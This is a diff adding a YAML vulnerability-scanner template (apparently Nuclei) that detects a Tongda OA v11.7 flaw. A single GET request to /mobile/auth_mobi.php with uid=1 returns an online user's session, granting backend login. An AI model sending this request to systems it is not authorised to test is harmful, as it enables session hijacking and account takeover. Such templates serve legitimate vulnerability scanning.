@@ -1,0 +1,27 @@
+id: tongdaOA-v11_7-auth-mobi-user-login
+
+info:
+  name: 通达OA v11.7 auth_mobi.php 在线用户登录漏洞
+  author: cnaq
+  severity: high
+  description: 通达OA v11.7 中存在某接口查询在线用户，当用户在线时会返回 PHPSESSION使其可登录后台系统
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20auth_mobi.php%20%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.html
+  tags: tongdaOA,PHPSESSION,login
+requests:
+  - raw:
+      - |
+        GET /mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        negative: true
+        words:
+          - 'RELOGIN'
